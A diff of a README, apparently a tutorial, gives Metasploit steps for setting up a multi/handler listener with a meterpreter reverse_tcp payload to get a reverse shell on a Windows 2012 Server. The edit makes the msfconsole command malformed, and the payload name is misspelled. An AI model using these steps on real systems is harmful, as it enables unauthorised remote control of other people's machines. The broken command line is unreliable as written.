@@ -4,7 +4,7 @@ This is a demonstration of obtaining a reverse shell on a Windows 2012 Server. T
 ### The following steps are provided to obtain a reverse shell on a Windows 2012 Server. The steps performed, were carried out in a secure environment. Please ensure, if you do choose to replicate this activity that you either do so as qualified practitioner or that you have a qualified practitioner with you.
 
 # Step 1 : Create a reverse handler using metasploit. To do so, you run the following commands -
-  -1.1 - sudo msfconsole
+  -1.1 - sudo msfconsole, "\n"
   -1.2 - use multi/handler
   -1.3 - configure payload (preferable : windows/meterpreter/rerverse_tcp)
   -1.4 - ensure that the "LHOST" and "LPORT" settings are correctly configured. You may do so, by running : set LHOST <IP Address of Host> and the set LPORT <port you would like to listen on>
